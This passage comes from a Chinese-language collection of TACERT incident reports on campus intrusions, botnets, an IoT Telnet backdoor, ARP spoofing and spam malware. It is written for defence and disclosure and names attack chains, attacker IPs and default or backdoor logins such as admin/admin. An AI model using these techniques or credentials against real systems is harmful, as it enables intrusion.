        "content": "X.X.11(11 主機)與1.162.218.60,推測 這些IP 的主機可能存在資安問題。 在這些連線11 主機的IP 中發現有2 個來自台灣的IP,分別為 IP:118.167.46.193 與IP:61.219.11.151,這些IP 也會連線34 主機。 III. 事件攻擊行為示意圖 因駭客多次入侵受害主機,為了清楚呈現本個案之事件攻擊行為,將以駭客 入侵主機的三個日期2017/9/18、2018/11/7 與2018/11/19 分別敘述如下:  17 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 駭客在2017/9/18 入侵11 主機時執行下列惡意行為 (1) 駭客透過IP:202.39.79.22 以RDP 方式登入11 主機。 (2) 駭客於11 主機上手動操作開啟123.rar。 (3) 駭客以Web 方式讀取123.rar。 (4) 將kkkkkkkkkk.txt 與update.txt 放入11 主機的網站根目錄下。 (5) 以Web 方式讀取2.txt、test.txt 與test.exe。 (6) 以Web 方式將2.txt 放入網站資料夾中。 (7) 將cmd.hta 放入網站根目錄下。 (8) 以web 方式讀取kkkkkkkkk.txt 與cmd.hta。 (9) 將kkkkkkkkk.exe 放入網站根目錄下。 (10) 以Web 方式讀取kkkkkkkkk.exe。  18 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 上圖為kkkkkkkkk.exe 於網站上被瀏覽者下載執行後的惡意行為示意圖。 (1) 當瀏覽者以Web 方式讀取kkkkkkkkk.exe 時,會下載該檔案至自己主機。 (2) 執行kkkkkkkkk.exe 後會呼叫系統檔mshta.exe。 (3) mshta.exe 執行後會連線http://192.X.X.11/cmd.hta,並執行它。 (4) cmd.hta 執行後會連線http://192.X.X.11",
        "Page_Num": "17,18,19"
    },
    "485": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
        "content": "/update.txt,並下載它。 (5) 將update.ext 更名為svchost1.exe。 (6) 執行svchost1.exe 後會連線美國主機(IP:203.74.56.209)。  19 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2.駭客在2018/11/7 入侵11 主機與34 主機時執行下列惡意行為 (1) 駭客透過IP:202.39.79.22 以RDP 方式駭入11 主機。 (2) 駭客將rassauto.dll 放入11 主機內。 (3) 新增可連線IP:192.X.X.12 主機的Default.rdp。 (4) 新增防火牆輸入規則user-connection。 (5) 駭客從11 主機以RDP 方式駭入34 主機。 (6) 駭客從IP:202.39.79.22 以RDP 方式駭入34 主機。 (7) 修改Primary_IP.TXT 與SC2008TUT.ini 檔案。 (8) 將msiscsiex.dll 放入34 主機中。 (9) 將system1.exe 放入11 主機中。 (10) 將inetinfo.exe 放入34 主機中。 (11) 新增2 個防火牆輸入規則inetinfo.exe 與user-connection。 (12) System1.exe 執行後會連線34 主機。  20 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3.駭客在2018/11/19 入侵11 主機時執行下列惡意行為 (1) IP:192.X.X.216 以RDP 方式登入11 主機。 (2) 駭客將m64.iso 與x64.tmp 放入11 主機內。 (3) 將help.bat 放入11 主機內。 (4) 將m64.iso 執行後的結果存入dat.tmp 中。 IV. 建議與總結 1. 本個案由檢測34 主機進而發現11 主機有被駭客入侵的情形,駭客多次透 過台灣IP:202.39.79.22 以RDP 方式登入11 主機,並且透過11 主機連線 34 主機。 2. CVE-2017-8759 為 2017 /9 被發現的.NET Framework 漏洞,而",
        "Page_Num": "19,20,21"
    },
    "486": {
        "File_Name": "個案分析-校園網站伺服器淪為中繼站與惡意程式下載站攻擊事件分析報告_10802.pdf",
        "content": "11 主機 與34 主機在2017 年下半年無系統更新行為,兩主機存在該漏洞。駭客在 11 主機內將CVE-2017-8759 的惡意程式放在網站根目錄下,讓網站變成 惡意程式下載站,並且也置入每次重新開機就會啟動的system1.exe,透 過該程式的執行會持續連線34 主機進行報到。 3. 檢視本個案11 主機與34 主機的資安防護缺失,有下列幾點提供參考。 (1)兩主機皆使用相同的系統管理者帳號與密碼。 (2)兩主機皆開啟駭客容易攻擊的port,如445port 與3389port。 (3)兩主機對於RDP 連線方式皆未控管連線來源IP。  21 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (4)兩主機在2017/9 期間皆存在CVE-2017-8759 漏洞,未更新系統與修補 漏洞。 4. 針對本個案的資安防護措施提供幾點建議事項提供參考。 (1) 加強系統管理者帳戶的密碼強度,並且定期更新密碼。 (2) 勿使用相同帳號與相同密碼管理多台主機,也避免多個服務所用之帳 號共用同一組密碼。 (3) 控管網站目錄的使用者存取權限。 (4) 限制由使用者上傳檔案至網站伺服器的檔案類型。 (5) 定期備份主機資料。 (6) 定期查看所管理主機的系統狀態,並且更新作業系統、應用程式與病 毒碼至最新版本。 (7) 管控以RDP 方式連線主機的來源IP。 (8) 檢視主機已開啟的Port 是否有開啟之必要性。 ",
        "Page_Num": "21,22"
    },
    "487": {
        "File_Name": "個案分析-殭屍網路中進行HTTP Flood的惡意程式分析報告_10501.pdf",
        "content": "個案分析- 殭屍網路中進行HTTP Flood 的惡意程式分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2016/1  1 I. 事件簡介 1. 發展殭屍網路主機一直是現今駭客最主要的目標之一,透過殭屍主機能讓 駭客的網路犯罪更加容易。 2. 然而殭屍主機的網路行為有許多種,大多的殭屍主機對於使用者來說可能 不會有明顯的察覺。 3. 本次研究的一種殭屍主機行為是會對特定網站進行HTTP Flood 攻擊,然 而該惡意程式並不會造成大量的頻寬壅塞。 4. 此惡意程式並能夠監控該殭屍主機並進行遠端操控。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7 (x86)系統進行隔離環境測試。 2. 惡意程式樣本名稱為Flooder_by_CM.exe 的執行檔,檔案圖示為某女性大 頭照,測試過程中會側錄其網路行為進行分析。 3. 該檔案執行後會在背景安裝一些程式,並觀察網路流量監控,發現開始出 現大量異常的網路連線。 4. 透過currport 網路監控軟體可以觀察到,會有系統程式產生大量 sessions 連到外部的網頁伺服器port 80。 5. 隨後用procexp 檢查背景程序執行狀態,出現兩個系統內建程式 iexplorer.exe 的異常執行,而大量的異常連線就是透過該程式去執行。  2 6. 從封包紀錄來看,這些異常連線的封包大小都不大,只有300 Bytes,而 內容只是單純的TCP 三向交握以及結束連線,主要目的是增加伺服器的負 荷量以達到DoS 的功能。 7. 紀錄中被攻擊的伺服器位址都是Google 的首頁或Google 的cache 伺服 器,其中以IP: 173.194.X.X、64.233.Y.Y、163.28.Z.Z (TANET)、 202.169.W.W (SINICA) 為大宗。 8. 此外用autoruns 檢查開機自動啟用程序,發現到惡意程式的位址及名稱  3 為「desktopplayer.exe、rfusclientsrv.exe 和 rutservsrv.exe」,都 是藏",
        "Page_Num": "1,2,3,4"
    },
    "488": {
        "File_Name": "個案分析-殭屍網路中進行HTTP Flood的惡意程式分析報告_10501.pdf",
        "content": "在C:\\program files\\ 底下資料夾中。 9. 經過測試得知 desktoplayer.exe 就是背景執行iexplorer.exe 程式,因 此就算重新開機也是會有對外的大量tcp 連線產生。透過virustotal 掃 描得知該程式原來是 nestopiaSrv.exe,其偵測比例有 51/54 的惡意程 式。 10. 此外在開機啟動程式中多了 rfusclientsrv.exe 和 rutservsrv.exe,檢查 procexp 中該程式網路狀態,發現到TCP 通訊埠 5060 是被開啟狀態。 11. 從軟體RMS 及開發商名稱TektonIT 可以得知該程式的功能為遠端桌面  4 操控伺服器,並且使用tcp port 5650 進行外部通訊。 12. 透過Virustotal 對rutservsrv.exe 和rfusclientsrv.exe 進行檢 測,得知分別的檢測比例為 23/54 和18/55 的遠端操控惡意程式。  5 13. 從封包紀錄中觀察到主機會向 90.156.241.111:80 進行POST 動作,內 容包含了遠端控制需要的帳號及密碼和主機名稱,供駭客能夠登入。實際 使用遠端桌面軟體測試,確實能夠透過封包中的密碼進行登入,已完全掌 控使用者電腦權限。  6 III. 網路架構圖 使用者BOT TCP port 5060 open 90.156.241.111:80 接收遠端帳密 STEP 3 POST 遠端控制 帳號密碼 惡意程式 Flooder 駭客 STEP 1.2 安裝惡意程式 STEP 1.1 散播惡意程式 Google 網頁伺服器 port80 173.194.X.X、64.233.Y.Y ... STEP 2 TCP SYN Flood DoS Attack STEP 5 遠端登入控制 BOT STEP 4 取得BOT 遠端帳號密碼 1. 使用者可能透過網站或APT 攻擊安裝到駭客散步的惡意程式成為BOT。 2. 主機安裝惡意程式後向Google 網站和緩衝伺服器發動TCP SYN Flood 阻斷 服務攻擊。 3. 同時BOT 主機回傳遠端登入的帳號密碼給 90.156.241.111 主機。 4. ",
        "Page_Num": "4,5,6,7"
    },
    "489": {
        "File_Name": "個案分析-殭屍網路中進行HTTP Flood的惡意程式分析報告_10501.pdf",
        "content": "駭客再透過90.156.241.111 主機取的BOT 的遠端登入帳號密碼。 5. 駭客不定期登入BOT 主機進行其他惡意行為,如植入其他惡意程式。 IV. 建議與總結 1. 建議使用者不要下載開啟來路不明的檔案安裝,通常都內含木馬程式。 2. 一旦執行該惡意程式會成為殭屍電腦,對外部網站伺服器進行TCP 的洪氾攻 擊。 3. 很多主機成為殭屍電腦使用者並不會知道,此例中對外產生攻擊的流量還不 算太大,故很難察覺。  7 4. 該惡意程式並會自動安裝遠端桌面操控的VNC 軟體,以便讓駭客能隨時登入 操控主機。 5. 透過TCPView 檢查是否有可疑的通訊埠被開啟並為Listening state. 6. 該惡意程式在防毒軟體偵測比例算高,因此只要安裝防毒軟體就能避免被感 染。 7. 一旦安裝到惡意程式,可以透過免費微軟的sysinternal 套裝工具進行程式 和網路連線檢查移除。。 ",
        "Page_Num": "7,8"
    },
    "490": {
        "File_Name": "個案分析-物聯網IoT監視器Telnet暴力入侵攻擊事件分析報告_10507.pdf",
        "content": "個案分析- 物聯網IoT 監視器Telnet 暴 力入侵攻擊事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2016/7  1 I. 事件簡介 1. 近期學術網路內許多單位陸續被開立Telnet.Login.Brute.Force 資安事件 單,經由追查發現似乎都來自特定廠牌型號的IoT 監視器主機。 2. 物聯網(英語:Internet of Things,縮寫IoT)是網際網路、傳統電 信網等資訊承載體,讓所有能行使獨立功能的普通物體實作互聯互通的 網路。 3. 該監視器有個統一特性是,網頁管理介面的帳號密碼都是用出廠預設值 admin,輕易能夠登入設定並監看影像內容。 4. 本單位有與該設備廠商詢問過,廠商回應是雲端伺服器同步的誤判事 件。 5. 為了驗證是否為廠商所言誤判,故與其中一個單位聯絡,協助進行封包 側錄並進行數位鑑識工作。 II. 事件檢測 1. 通常監視器主機都有開起Web service,方便讓管理者能夠登入監看操 作,輸入主機IP 可以看到登入的頁面,帳號密碼為預設值。  2 2. 使用預設帳密登入後,查看日誌並無明顯可疑的登入紀錄,同時檢查系 統韌體版本當時為 2015-01-30 的版本。 3. 從Web 登入的介面只有基本的監視器功能,並無法於作業系統核心進行 操作,因此只能先從側錄的封包紀錄中去檢查。 4. 首先驗證是否該監視器主機有對外攻擊現象,透過封包紀錄來看該主機 確實短時間內密集對外部進行 telnet 連線行為。 5. 檢查其中一個連線內容來看,可以看到確實有嘗試以 root/1111111 登 入失敗紀錄。  3 6. 找到對外攻擊的事證後,接著要查找監視器主機可能被入侵的原因。從 封包紀錄中得知監視器主機的port 23 也是開啟的,表示有啟用Telnet 的服務讓其他人能登入。 7. 封包紀錄中看到多筆外部IP 如中國115.228.109.217 成功登入監視器 的TELNET 服務。 8. 檢查紀錄",
        "Page_Num": "1,2,3,4"
    },
    "491": {
        "File_Name": "個案分析-物聯網IoT監視器Telnet暴力入侵攻擊事件分析報告_10507.pdf",
        "content": "查看內容,得知駭客使用的帳號密碼為 root/****** ,應為廠 商預留的後門,以及底層為linux-based 的Busybox v1.16.1。 9. 該busybox 作業系統能使用的指令相對較簡陋,無法透過外部下載方式 或內部檔案編輯指令“vi”寫入後門惡意程式,因此駭客透過指令“>” 建立所需的檔案名稱,並在透過“>”將欲執行指令批次寫入 retrieve 中。 10. 駭客先將可執行的shell 指令busybox 寫入 retrieve,接著透過 echo 方式將指令用 16 進位的 ASCII 編碼顯示並用 >> 寫入到 retrieve,透過 decoder 將部分編碼解開,開頭是“ELF”的執行檔。  4 11. 由於指令echo 後內容較多,但透過指令 cat 顯示其retrieve 執行檔 內容為如下,其行為就是對外進行 telnet 暴力破解攻擊。 12. 實際透過後門的帳密Telnet 登入,並netstat 查看網路連線狀態,可 以看到有大量的對外telnet 連線。  5 13. 雖得知攻擊程式顯示為–sh 的程序,事實上為 retrieve 的執行成 果,因為駭客在執行攻擊程式後會刪除執行檔,避免程式碼外流。 14. 駭客習慣在 /var/ 路徑下建立修改需要的檔案,因為連入的駭客不只 一個,所以駭客建立的檔案通常變動很快也不完整。 15. 監視器也會持續建立連線到上層C&C 塞席爾 89.248.162.146 的port 80,作為監控的報到用途,而阿根廷190.195.170.202 連線表示其中一 個駭客已經telnet 登入中。 16. 此案例推測為韌體的漏洞後門導致遭受入侵,因為在廠商進行線上更新 韌體版本並重開機,原本的telnet 服務就被關閉無法登入,在此之後的 telnet 攻擊流量也就消失。韌體版本已經更新至 2015-12-12。 III. 網路架構圖  6 C&C主機 塞席爾 89.248.162.146:80",
        "Page_Num": "4,5,6,7"
    },
    "492": {
        "File_Name": "個案分析-物聯網IoT監視器Telnet暴力入侵攻擊事件分析報告_10507.pdf",
        "content": "駭客 190.195.170.202 5.80.126.60 15.228.109.217 STEP 2 HTTP定期回報 Port 80 178.204.125.7 75.60.82.6 118.171.101.11 ... STEP 3 Telnet 暴力破解攻擊 STEP 1 TELNET 後門 寫入攻擊指令 DVR 監視器主機 Busybox linux 客戶、廠商 STEP 4 Web Login 監控、韌體更新 1. 駭客透過監視器韌體版本漏洞,從TELNET 後門使用預設帳密入侵。 2. 監視器會固定連線回報到上層C&C。 3. 駭客透過echo 指令寫入攻擊程式碼,對外部大量主機進行Telnet 暴力破 解攻擊。 4. 客戶端和廠商透過Web 介面登入,並且能夠線上更新系統韌體修補漏洞。 IV. 建議與總結 1. 此個案主機在Web 服務介面就無變更過帳號密碼,只要使用預設值任何 人都能登入操控監視器。 2. 駭客透過監視器韌體版本漏洞,並使用root 和預設密碼從Telnet 的 port 23 登入,進行對外telnet 攻擊。 3. 監視器的底層OS 為busybox,能夠使用的指令很少,故駭客透過echo 指令取代一般的文書編輯指令去寫入惡意程式碼。 4. 駭客執行完惡意程式後可能刪除檔案,不讓其他人能夠存取,故主機從 開機後駭客必須再次登入操作才能發動攻擊。 5. 經測試發現當系統韌體更新後,原本的TELNET 後門就無法登入,表示新  7 的韌體已經作出修正。 6. 此監視器為台灣自製的品牌,可能為工程師在製作過程中預留的後門, 反而成為駭客輕易入侵的漏洞。 ",
        "Page_Num": "7,8"
    },
    "493": {
        "File_Name": "個案分析-由IRC BOT引起的ARPspoofing分析報告.pdf",
        "content": "個案分析- 由IRC Bot 引起的ARP Spoofing 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2012/4  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 目錄 事件說明 ............................................................................................ 2 事件處理時間表 ................................................................................. 2 詳細流程 ............................................................................................ 3 受駭主機分析 ..................................................................................... 7 入侵手法分析 ..................................................................................... 9 建議措施 ............................................................................................ 9 參考 .................................................................................................. 10  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 事件說明 一、事件發生時間:2012/3/17 至2012/3/29 二、事件分類:區網內部ARP SPOOFING 三、事件現象:2012/3/17 同區網內陸續傳出多台主機開機使用DHCP 上網時,出 現「IP 衝突」訊息,因而不斷地向DHCP 主機要網路位址,然而DHCP 主機可發派的 位址已耗竭,許多使用DHCP 上網的主機要不到IP 無法上網。初步判斷有主機可能中 了ARP SPOOFING 病毒。調查具有「IP 衝突」主機後,發現並沒有異狀,轉而側錄該 網段封包,發現封包中異常的MAC 地址,循MAC 地址找到導致此事件起因的主機。 事件處理時間表 表一、處理流程 時間 事件 說明 2012/03/20 對該區網內有「IP 衝突」而無法上網的電腦進行 調查:  沒有掃描到惡意軟體  該主機僅在使用DHCP 上網會出現「IP 衝 突」,使用3G 等其他方法上網皆可正常使用 判斷該主機並不是因 為中毒才出現「IP 衝 突」 2012/03/21 另外一台因為「IP 衝突」而被判可能中毒的電腦 在重灌之後,仍持續有「IP 衝突」的問題,之後, 使用固定位址上網解決了「IP 衝突」 判斷導致該區網多台 電腦出現「IP 衝突」 的原因並非主機本身 2012/03/22 | 2012/03/27 在出現「IP 衝突」的主機上側錄網路封包 發現ARP",
        "Page_Num": "1,2,3"
    },
    "494": {
        "File_Name": "個案分析-由IRC BOT引起的ARPspoofing分析報告.pdf",
        "content": "Table 有一 個MAC 地址綁了多 個同網段的位址,並發  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 現異常的ARP 封包 2012/03/29 由MAC 找到該攻擊實體主機。取主機網路狀況 與主機檔案 在主機中發現IRC Bot 的相關檔案 詳細流程 2012/03/19 某一學校機構的C1.X2.68.0/24 網段陸續傳出多台電腦出現「IP 衝突」, 導致無法上網,疑似大批電腦中毒現象。C1.X2.68.0/24 網段使用DHCP 取得IP 位址, 位於該網段的主機開機之後向DHCP 要IP 以及網路閘道、DNS 等資訊,DHCP 會發派 沒有主機使用的IP 給發出DHCP 請求的主機,03/19 出現許多主機不斷地向DHCP 要 IP 的現象。 出現「IP 衝突」的電腦使用其他方法可正常上網,在其他網段使用DHCP 上網也正 常。另外有一台因為「IP 衝突」被判中毒的電腦重灌之後仍持續有「IP 衝突」的問題, 顯示「IP 衝突」並不是本機端電腦中毒引起,加上在這些主機上面找不到任何可疑的病 毒,所以判定可能是因為沒有更新而有未修補的漏洞。 進行更新之後,「IP 衝突」問題仍存在,既不是病毒引起,也不是未更新而有漏洞 存在,所以將問題的起因排除這些出現「IP 衝突」的電腦,轉而尋找其他原因。2012/03/22 側錄一台有「IP 衝突」現象的主機封包(MAC 地址為14:da:e9:57:98:26),於封包中發 現如圖1 所示現象,該主機不斷跟DHCP 請求IP,得到IP 後又發現該IP 已經有其他主 機使用,所以又重新請求。 DHCP Discover:主機發出廣播封包詢問是否有DHCP 主機存在 DHCP Request:主機回應DHCP 的位址指派 DHCP Decline:主機發現DHCP 發派的位址已有人使用,拒絕這個發派  4 Taiwan Academic Network Computer emergency Response Team(TACERT) ",
        "Page_Num": "3,4,5"
    },
    "495": {
        "File_Name": "個案分析-由IRC BOT引起的ARPspoofing分析報告.pdf",
        "content": "圖1、MAC 為14:da:e9:57:98:26 的主機不斷的向DHCP 發出請求 之後在該主機的ARP Table 發現某個MAC 綁了多個同網段的位址。為了判斷這些 網路位址是否真有主機使用,在同一個網段(C1.X2.68.0/24)使用PING 指令測試,實 體位址為00-08-9b-ca-7b-98 的IP 皆有主機回應,但是從其他網段PING 這些IP 卻沒有 回應。 介面: C1.X2.68.63 --- 0xa 網際網路網址 實體位址 類型 C1.X2.68.1 00-08-9b-ca-7b-98 動態 C1.X2.68.16 00-22-68-64-0e-0d 動態 C1.X2.68.23 8c-64-22-b5-32-45 動態 C1.X2.68.28 00-01-6c-6b-a2-f6 動態 C1.X2.68.33 00-08-9b-ca-7b-98 動態 C1.X2.68.37 20-cf-30-07-bf-0f 動態 C1.X2.68.41 00-1f-c6-7c-e5-5c 動態 C1.X2.68.77 14-da-e9-57-98-8c 動態 C1.X2.68.90 00-08-9b-ca-7b-98 動態 C1.X2.68.96 00-08-9b-ca-7b-98 動態 C1.X2.68.97 00-0a-e4-f9-b5-f1 動態 C1.X2.68.110 8c-64-22-b5-32-45 動態 C1.X2.68.130 00-1e-33-24-4b-e0 動態 C1.X2.68.141 00-08-9b-ca-7b-98 動態 C1.X2.68.148 e8-e0-b7-32-7f-56 動態 C1.X2.68.153 00-08-9b-ca-7b-98 動態 C1.X2.68.164 54-04-a6-2e-f6-71 動態 C1.X2.68.167 00-08-9b-ca-7b-98 動態 C1.X2.68.173 00",
        "Page_Num": "5"
    },
    "496": {
        "File_Name": "個案分析-由IRC BOT引起的ARPspoofing分析報告.pdf",
        "content": "-08-9b-ca-7b-98 動態  5 Taiwan Academic Network Computer emergency Response Team(TACERT) C1.X2.68.179 00-08-9b-ca-7b-98 動態 C1.X2.68.187 00-08-9b-ca-7b-98 動態 C1.X2.68.190 00-01-6c-6b-a2-ee 動態 C1.X2.68.193 50-e5-49-50-3f-31 動態 C1.X2.68.200 00-1d-60-e3-fa-fa 動態 C1.X2.68.213 00-22-68-64-0d-fb 動態 C1.X2.68.254 f8-c0-01-ce-15-01 動態 C1.X2.68.255 ff-ff-ff-ff-ff-ff 靜態 表1、C1.X2.68.0 網段某主機的ARP Table 同時也發現一個MAC 為00:08:9b:ca:7b:98 的主機,不斷地發出異常的ARP 封包, 詢問不再該網段內的主機,頻率約莫每一秒一次(如圖2),其詢問的IP 如表2 所列。 ARP Table 與異常的ARP 封包都由同一個MAC 產生,判斷該MAC 為「IP 衝突」事件 的起因,查出該主機為某實驗室擁有的NAS 主機。 圖2、異常的ARP 封包 IP Country 95.141.29.10 德國 irc.euro-transit.net 208.83.20.130 美國 irc.undernet.org 194.109.20.90 荷蘭 irc.undernet.org  6 Taiwan Academic Network Computer emergency Response Team(TACERT) 195.197.175.21 芬蘭 irc2.saunalahti.fi 94.125.182.255 匈牙利 irc.undernet.org 195.47.220.2 哈薩克 ircu.atw.hu 64.18.128.86 美國 irc.justedge.net 130.237.188.216 瑞典 irc.undernet.org 表2、異常的ARP 封包所詢問的IP[1]  7 Taiwan Academic Network Computer emergency Response Team(TACERT) 攻擊主機分析 MAC 地址為00:08:",
        "Page_Num": "5,6,7,8"
    },
    "497": {
        "File_Name": "個案分析-由IRC BOT引起的ARPspoofing分析報告.pdf",
        "content": "9b:ca:7b:98 的主機資料: 硬體:QNAP TS-239 Pro II+ 主機用途:提供資料儲存 許多主機出現「IP 衝突」的現象,是因為MAC 地址為00:08:9b:ca:7b:98 的主機沒 有透過DHCP 取得IP,私自綁了該網段的許多IP 在主機上,而DHCP 並沒有這些IP 被使用的紀錄,所以將IP 發派出去後,客戶端會馬上出現「IP 衝突」。 圖3、MAC 為00:08:9b:ca:7b:98 的主機綁了許多個IP  8 Taiwan Academic Network Computer emergency Response Team(TACERT) 在隱藏目錄/mnt/hda_root/.config/ssh/ecmf/.x 下有駭客入侵後下載的檔案,圖4 列出主要 的幾個檔案,圖五為m.set 檔內容,由這些檔案內容可以推斷駭客意圖在主機植入IRC Bot,但由於主程式xh,由perl 寫成,而受害主機上並沒有安裝perl,且網路流量也沒 有發現與IRC 有關的流量,故推斷受害主機上的IRC Bot 並沒有執行成功。駭客僅在網 路狀態設定上有成功,至於在該主機上綁了許多IP,應是為了使主機在大量IP 的掩護 下連上IRC Server,躲避偵測。 圖4、隱藏目錄/mnt/hda_root/.config/ssh/ecmf/.x 下的檔案 圖5、m.set 檔裡的內容與異常ARP 封包所詢問的IP 符合 主程式  9 Taiwan Academic Network Computer emergency Response Team(TACERT) 入侵手法分析  主機使用簡單帳號密碼(admin/admin)  主機使用出廠預設帳號密碼(admin/admin)  未限制最大權限管理者遠端登入的位址 由於QNAP 公司的NAS 出廠之後的管理者帳號和密碼預設都是admin/admin,為一 組經典的簡單帳號與密碼,該台主機管理者並沒有改變其密碼,也沒有限制遠端登入的 位址,加上該主機命令列的History ",
        "Page_Num": "8,9,10"
    },
    "498": {
        "File_Name": "個案分析-由IRC BOT引起的ARPspoofing分析報告.pdf",
        "content": "最後是刪除命令列的歷史紀錄,所以確定駭客使用 SSH 登入取得主機控制權進行入侵。 建議措施 區網管理者  使用DHCP 上網的網段,建議無DHCP 紀錄的IP 應禁止其對外連線  網域閘道的ARP TABLE 可參照DHCP 的IP 租用紀錄靜態設置 一般使用者  更改管理員密碼,不使用字典詞彙  不使用出廠預設密碼  對super user 的遠端登入進行控管  10 Taiwan Academic Network Computer emergency Response Team(TACERT) 參考 [1] Robtex Swiss Army Knife Internet Tool, http://www.robtex.com/ ",
        "Page_Num": "10,11"
    },
    "499": {
        "File_Name": "個案分析-發送垃圾郵件的郵件病毒分析報告_10503.pdf",
        "content": "個案分析- 發送垃圾郵件的郵件病毒分 析報告 TACERT 臺灣學術網路危機處理中心團隊製 2016/3  1 I. 事件簡介 1. 近期接獲國外通知說,本單位疑似有email 大量發送垃圾郵件,造成許多 困擾。 2. 通知信中對方有附上垃圾郵件夾的附加檔案 document.zip,本單位將進 行虛擬主機測試。 3. 由於對方並無提供原始垃圾郵件的原始碼,檢查後本單位並無有濫發垃圾 郵件事實,初步判定應該是被偽造成的郵件地址。 II. 事件檢測 1. 首先將 document.zip 解壓縮後,產生出一個名為 document.htm 的PIF 檔案,在windows 檔案顯示中的附檔名 PIF 不會顯示出來,藉而隱藏偽 裝成htm 的文件檔。事實上它是一個MS-DOS 的執行檔,透過MS-DOS 模式 查詢就能看出其檔名。 2. 實際測試執行該惡意程式document.htm.pif 後,可以在系統背景看到該 程式的執行狀態。  2 3. 該程式會在隱藏路徑資料夾中產生一個 services.exe,並且由父程式 PIF 檔呼叫執行。 4. 惡意程式的網路行為主要是由 services.exe 進行對外通訊,會連線到外 部IP 的port 1034 進行資料傳送,從紀錄中對外的連線IP 就有244 筆。 同時該程式也會開啟TCP port 1034 為 LISTENING 狀態,以便接收外來 連線資料,約有22 筆連線IP 數。  3 5. 從往來的port 1034 連線紀錄中,例如連線到美國16.209.5.12:1034 的 封包,發現該連線封包的payload size 皆為0 bytes,表示該連線並沒 有真正建立通訊,只是以封包做為探測監控用途。 6. 從Procexp 觀看主機背景程式運作情形得知,除了services.exe 有網路 行為之外,其父程式 document.htm.pif 更有大量的網路連線產生。並且 占用大量頻寬開始對外郵件主機的port 25 發送資料。 7. 從封包紀錄觀察中可以知道,該程式會",
        "Page_Num": "1,2,3,4"
    },
    "500": {
        "File_Name": "個案分析-發送垃圾郵件的郵件病毒分析報告_10503.pdf",
        "content": "對外主機進行SMTP 協定的連線就 有3087 筆的IP 數量,其原理就是發送大量的垃圾病毒郵件給一般電子郵 件使用者,並且偽造發送者的位址給對方並且夾帶同樣的病毒誘使對方開 啟。  4 8. 惡意郵件在發送時,寄件者都會偽造成與收件者同網域的位址,且內容主 要都是訴說收件者可能中毒再發送大量垃圾郵件,並請打開附件檢查主機 安全。而事實上附件本身就是造成此影響的惡意程式。 9. 既然document.htm.pif 會大量發送惡意電子郵件,則收件者地址必有規 則可循。從封包紀錄中可以看到有大量HTTP 的封包進行 search request 的動作,主要都是連線到 「search.lycos.com、 search.yahoo.com、 www.google.com、www.altavista.com」等常見的收尋引擎網站進行收件 地址查詢。 10. 例如其中一筆資料是惡意程式向 search.yahoo.com 進行 HTTP GET 進  5 行關鍵字“e-mail+rgia.su”搜尋,將找尋到的網域電子郵件列為收件人 清單發送,因此只要能被搜尋到的電子郵件都有可能會接收到垃圾郵件。 11. 搜尋網域 riga.su 的郵件紀錄,有一筆垃圾郵件是透過偽造寄件者 pequonnoc@aol.com 寄給 kidr@rgia.su ,並且主旨是“delivery failed”和附件 file.zip 的病毒。 III. 網路架構圖  6 搜尋引擎 Google、Yahoo、 Lycos、altavista 感染 document.exe 駭客端 STEP 1 安裝惡意程式 STEP 3 查詢網域Mail地址 SPAM Mails 郵件伺服器 及收件人 STEP 4 垃圾惡意郵件攻擊 STEP 2 監控主機存活 Port 1034 垃圾郵件 document.zip STEP 5 更多使用者收到垃圾郵件 1. 收到夾帶惡意程式document.zip 的電子郵件。 2. 主機感染惡意程式後開啟port 1034 讓駭客端可以連線。 3. 感染主機會向特定的搜尋引擎網站查找可攻擊",
        "Page_Num": "4,5,6,7"
    },
    "501": {
        "File_Name": "個案分析-發送垃圾郵件的郵件病毒分析報告_10503.pdf",
        "content": "的電子郵件網域。 4. 感染主機開始向這些網域的郵件伺服器發送垃圾郵件給使用者。 5. 使用者感染到垃圾郵件中的惡意程式進而擴散。 IV. 建議與總結 1. 此個案主要是透過惡意的SPAM 郵件進行傳播感染,而且會偽造郵件寄件 人地址誘使對方上鉤開啟郵件附件。 2. 惡意附件檔案會偽造成 htm 文字檔案,事實上是pif 的MS-DOS 執行檔案。 3. PIF 在Windows 系統中的視窗瀏覽下副檔名是隱藏不顯示,就算是開啟顯 示副檔名功能也是如此。 4. 使用者一旦開啟惡意程式後,惡意程式就會在系統背景隱藏執行,並且大 量發送惡意郵件給其他使用者。 5. 感染主機同時也會開啟port 1034 接受駭客或其他主機的連線監控。 6. 使用者對於有附加檔案或網址的郵件開啟前務必仔細檢查,以免遭受病毒  7 感染。 7. 此案例的病毒並不會常駐在開機自動啟動,因此只要重新開機惡意程式就 不會被執行。 8. 此類惡意程式大多能被防毒軟體偵測到,因此務必將防毒軟體更新至最 新。 ",
        "Page_Num": "7,8"
    },
    "502": {
        "File_Name": "個案分析-礦工木馬PhotoMiner病毒事件分析報告_10609.pdf",
        "content": "個案分析- 礦工木馬PhotoMiner 病毒 感染校園主機事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年9 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 本資安事件為某校園主機感染惡意程式,對外進行大量21 port 的連線攻擊 行為。 2. 該惡意程式Photo.scr 是一隻名為「PhotoMiner」的蠕蟲,會將感染的使用 者端串連成殭屍網路,並入侵脆弱的FTP 主機,目的在拓展更多挖掘貨幣所 需的運算資源。 3. 此惡意程式Photo.scr 偽裝成一隻Windows 螢幕保護程式,來降低使用者的 戒心。 4. 經過統計發現該類型的資安事件在今(106)年7 月有24 件,本中心經受感染 單位提供檢測樣本開始進行分析。 II. 事件檢測 1. 使用2 台安裝Windows 7 系統的VM 虛擬主機進行隔離環境測試,兩台主機分 別為Test1 主機(IP:192.168.44.60)與Test2 主機(IP:192.168.44.30),而  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在Test1 主機內有5 個本機磁碟與1 個連到Test2 